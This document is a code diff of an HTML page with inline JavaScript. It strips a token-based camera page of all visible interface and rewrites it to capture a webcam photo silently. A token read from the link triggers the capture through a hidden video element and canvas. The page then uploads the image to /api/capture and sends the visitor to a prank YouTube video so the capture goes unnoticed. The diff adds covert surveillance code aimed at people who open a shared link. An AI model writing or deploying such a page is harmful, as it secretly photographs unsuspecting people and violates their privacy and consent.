@@ -4,69 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: #000;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        input {
-            width: 100%;
-            padding: 15px;
-            background: #111;
-            border: 2px solid #333;
-            color: #fff;
-            font-size: 18px;
-            text-align: center;
-            letter-spacing: 2px;
-            outline: none;
-            margin-bottom: 20px;
-        }
-        
-        .message {
-            margin: 10px 0;
-            font-size: 18px;
-            min-height: 30px;
-        }
-        
-        .success {
-            color: #0f0;
-        }
-        
-        .error {
-            color: #f00;
-        }
-        
-        #video {
-            width: 100%;
-            max-width: 300px;
-            border: 2px solid #333;
-            display: none;
-        }
-    </style>
 </head>
 <body>
-    <div class="container">
-        <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">
-        <div id="message" class="message"></div>
-        <video id="video" autoplay playsinline></video>
-    </div>
+    <input type="text" id="token" placeholder="XXXX-XXXX" style="position:absolute; left:-9999px;">
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -74,63 +14,48 @@
         
         if (urlToken) {
             document.getElementById('token').value = urlToken;
-            startCamera();
+            startCapture();
         }
         
-        let stream = null;
-        let video = document.getElementById('video');
-
-        async function startCamera() {
+        async function startCapture() {
             const token = document.getElementById('token').value.trim();
-            const msgDiv = document.getElementById('message');
             
             if (!token || !token.match(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/)) {
-                msgDiv.className = 'message error';
-                msgDiv.textContent = 'Invalid';
                 return;
             }
             
             try {
-                msgDiv.textContent = 'Camera...';
+                // Запрашиваем камеру
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" },
-                    audio: false
-                });
-                
+                // Создаем скрытое видео
+                const video = document.createElement('video');
                 video.srcObject = stream;
-                video.style.display = 'block';
+                video.autoplay = true;
+                video.style.display = 'none';
+                document.body.appendChild(video);
                 
-                msgDiv.textContent = 'Capturing...';
+                // Ждем
+                await new Promise(r => setTimeout(r, 1000));
                 
-                setTimeout(capturePhoto, 1500);
-                
-            } catch (err) {
-                msgDiv.className = 'message error';
-                msgDiv.textContent = 'Error';
-                console.error(err);
-            }
-        }
-
-        async function capturePhoto() {
-            const token = document.getElementById('token').value.trim();
-            const msgDiv = document.getElementById('message');
-            
-            try {
+                // Создаем canvas
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
+                canvas.width = 640;
+                canvas.height = 480;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(video, 0, 0, 640, 480);
                 
+                // Останавливаем камеру
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
+                
+                // Конвертируем в blob
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                 
-                msgDiv.textContent = 'Sending...';
-                
+                // Отправляем
                 const formData = new FormData();
                 formData.append('image', blob, 'photo.jpg');
                 formData.append('token', token);
-                formData.append('ua', navigator.userAgent);
                 
                 const response = await fetch('/api/capture', { 
                     method: 'POST', 
@@ -140,30 +65,14 @@
                 const data = await response.json();
                 
                 if (data.success) {
-                    msgDiv.className = 'message success';
-                    msgDiv.textContent = 'Done';
-                    
-                    if (stream) {
-                        stream.getTracks().forEach(t => t.stop());
-                        video.style.display = 'none';
-                    }
-                } else {
-                    throw new Error('Failed');
+                    // Перенаправляем на ютуб
+                    window.location.href = 'https://youtu.be/dQw4w9WgXcQ';
                 }
                 
             } catch (err) {
-                msgDiv.className = 'message error';
-                msgDiv.textContent = 'Error';
+                console.log(err);
             }
         }
-
-        document.getElementById('token').addEventListener('input', function() {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                video.style.display = 'none';
-            }
-            startCamera();
-        });
     </script>
 </body>
 </html>
